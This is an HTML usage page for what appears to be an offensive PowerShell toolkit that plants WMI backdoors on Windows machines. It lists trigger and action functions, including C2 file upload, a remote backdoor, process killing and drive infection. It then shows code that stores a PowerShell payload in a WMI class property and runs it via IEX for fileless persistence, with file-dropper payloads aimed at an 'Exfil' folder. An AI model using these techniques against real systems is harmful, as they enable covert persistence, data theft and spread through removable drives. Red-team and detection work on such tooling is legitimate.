<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Usage</title>
</head><body>Function New-WMIBackdoorTrigger:<br/>
New-WMIBackdoorTrigger -TimingInterval &lt;uint32&gt; [-TimerName &lt;string&gt;] [-TriggerName &lt;string&gt;]<br/>
New-WMIBackdoorTrigger -Datetime &lt;datetime&gt;<br/>
New-WMIBackdoorTrigger -ProcessName &lt;string&gt;<br/>
New-WMIBackdoorTrigger -NewOrModifiedFileExtensions &lt;string[]&gt;<br/>
New-WMIBackdoorTrigger -LockedScreen<br/>
New-WMIBackdoorTrigger -InteractiveLogon<br/>
New-WMIBackdoorTrigger -DriveInsertion<br/>
<br/>
Function New-WMIBackdoorAction:<br/>
New-WMIBackdoorAction -C2Uri &lt;uri&gt; -FileUpload<br/>
New-WMIBackdoorAction -C2Uri &lt;uri&gt; -Backdoor<br/>
New-WMIBackdoorAction -KillProcess<br/>
New-WMIBackdoorAction -InfectDrive<br/>
<br/>
Function Register-WMIBackdoor<br/>
Register-WMIBackdoor [-Trigger] &lt;hashtable&gt; [-Action] &lt;hashtable&gt; [[-ComputerName] &lt;string&gt;]<br/>
<br/>
#Create a new backdoor command queue<br/>
$CommandQueue = New-Object Collections.Queue<br/>
<br/>
#VBScript file dropper payload<br/>
$VBScript = @'<br/>
Dim oFSO, oFile, sFilePath<br/>
Set oFSO = CreateObject("Scripting.FileSystemObject")<br/>
sFilePath = "C:\Users\limited_user\Desktop\Exfil\foo.txt"<br/>
Set oFile = oFSO.CreateTextFile(sFilePath, True)<br/>
oFile.Write "foo"<br/>
oFile.Close<br/>
'@<br/>
<br/>
Add-WMIBackdoorCommand -CommandQueue $CommandQueue -VBScriptPayload $VBScript<br/>
<br/>
#Powershell file dropper payload<br/>
$PowerShellPayload = {'Hello, cruel world!' | Out-File C:\Users\Limited_user\Desktop\Exfil\bar.txt}<br/>
$ClassName = 'Win32_Server'<br/>
$PropertyName = 'Hostname'<br/>
$WMIStorageArgs = @{<br/>
&nbsp; &nbsp; CommandQueue = $CommandQueue<br/>
&nbsp; &nbsp; PayloadContents = $PowerShellPayload<br/>
&nbsp; &nbsp; WMIClassName = $ClassName<br/>
&nbsp; &nbsp; WMIClassPropertyName = $PropertyName<br/>
}<br/>
<br/>
# Persist the PowerShell Payload to the WMI repository<br/>
Add-WMIBackdoorCommand $WMIStorageArgs<br/>
<br/>
$CommandLine = @"<br/>
powershell -NoP -Command "IEX ([WmiClass]'$ClassName').Properties['$PropertyName'].Value"<br/>
"@</body></html>